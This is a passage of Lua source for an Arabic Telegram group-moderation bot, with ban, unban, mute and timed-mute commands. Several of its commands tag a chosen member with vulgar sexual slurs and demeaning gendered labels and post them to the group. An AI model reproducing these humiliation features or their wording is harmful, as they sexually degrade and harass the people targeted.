t = t..""..k.."» المتناك [@"..username.."]\n"
else
t = t..""..k.."» المتناك "..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد متناكين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local statuss = '\n ◉ تم رفع العضو علي زبك بنجاح\n ◉ تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل من زبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status = '\n ◉ تم تنزيل العضو من زبك\n ◉ هيفضل متناك بردو'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local statuss = 'تم قتله بنجاح ◉'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == 'مسح الحكاكين' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح كل الحكاكين')
end
if text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة حكاكين الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الحكاك [@"..username.."]\n"
else
t = t..""..k.."← الحكاك `"..v.."`\n"
end
end
if #list == 0 then
t = " ?? لا يوجد حكاك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع حكاك") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n ◉ تم رفع حكاك في الجروب\n ◉ احمرت ولا لسا'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل حكاك")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n ◉ تم تنزيل حكاك من الجروب\n ◉ لا يسطت هيفضل حكاك رسمي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'مسح النسوان' and Mod(msg) then
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح كل النسوان بالجروب')
end
if text == ("تاك للنسوان") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n ◉ قائمة نسوان الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← المره [@"..username.."]\n"
else
t = t..""..k.."← المره `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد نسوان غيرك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n ◉ تم رفع مره في الجروب\n ◉ ها صرتي من نسواني تعي ندخل'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مره")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n ◉ تم تنزيل مره من الجروب\n ◉ بتاعي غضبان عليكي ليوم الدين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'مسح المتزوجين' and Mod(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح جميع المتزوجين')
end
if text == ("تاك للمتزوجين") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n ◉ قائمه ازواج الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← الزوج [@"..username.."]\n"
else
t = t..""..k.."← الزوجه `"..v.."`\n"
end
end
if #list == 0 then
t = " ◉ مع الاسف لا يوجد متزوجين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ◉ تم زواجكم بنجاح في الجروب \n ◉ الطلاق امتي عشان ابقي موجود '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("طلاق")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n ◉ تم طلاقكم بنجاح في الجروب\n ◉ اوجعو تاني ونبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == 'مسح المحظورين' and Mod(msg) then
database:del(bot_id..'Ban:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح المحظورين')
end
if text == ("المحظورين") then
local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
t = "\n ◉ قائمة محظورين الجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ◉ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر @(.*)$") and Mod(msg) then
local username = text:match("^حظر @(.*)$")
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ◉  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.id_)
usertext = '\n ◉  المستخدم ← ['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n ◉ تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, ' ◉ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^حظر (%d+)$") and Mod(msg) then
local userid = text:match("^حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الحظر') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر البوت")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ◉ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, userid)
chat_kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end,nil)   
end
return false
end
if text == ("الغاء حظر") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ◉ انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and Mod(msg) then
local username = text:match("^الغاء حظر @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ◉ انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء حظره'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ◉ انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المكتومين' and Mod(msg) then
database:del(bot_id..'Muted:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح المكتومين')
end
if text == ("المكتومين") and Mod(msg) then
local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
t = "\n ◉ قائمة المكتومين \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مكتومين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم @(.*)$") and Mod(msg) then
local username = text:match("^كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم كتمه'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
end
else
send(msg.chat_id_, msg.id_, ' ◉ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match('^كتم (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ◉ عذرا لا تستطيع كتم ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^كتم (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n ◉ عذرا لا تستطيع كتم ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
